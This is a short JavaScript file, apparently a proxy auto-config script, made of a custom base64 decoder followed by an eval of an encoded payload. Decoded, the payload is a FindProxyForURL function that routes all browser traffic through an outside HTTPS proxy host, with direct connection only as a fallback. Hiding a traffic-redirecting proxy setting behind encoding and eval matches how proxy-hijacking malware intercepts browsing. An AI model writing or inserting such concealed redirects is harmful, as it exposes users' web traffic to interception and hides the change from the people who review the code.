function decode64(_1){var _2="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";var _3="";var _4,_5,_6;var _7,_8,_9,_a;var i=0;_1=_1.replace(/[^A-Za-z0-9\+\/\=]/g,"");do{_7=_2.indexOf(_
1.charAt(i++));_8=_2.indexOf(_1.charAt(i++));_9=_2.indexOf(_1.charAt(i++));_a=_2.indexOf(_1.charAt(i++));_4=(_7<<2)|(_8>>4);_5=((_8&15)<<4)|(_9>>2);_6=((_9&3)<<6)|_a;_3=_3+String.fromCharCode(_4);if(_9!
=64){_3=_3+String.fromCharCode(_5);}if(_a!=64){_3=_3+String.fromCharCode(_6);}}while(i<_1.length);return _3;}eval(decode64("ZnVuY3Rpb24gRmluZFByb3h5Rm9yVVJMKHVybCwgaG9zdCkgew0KCXZhciBERUZBVUxUID0gIkRJUkVDVCI7DQogIAl2YXIgUFJPWFkgPSAiSFRUUFMgc2dsbjAxLm50dGNvbm5lY3Rpb25zLmNvbTo0NDM7IisiRElSRUNUIjsNCglyZXR1cm4gUFJPWFk7IA0KfQ0KDQo="))

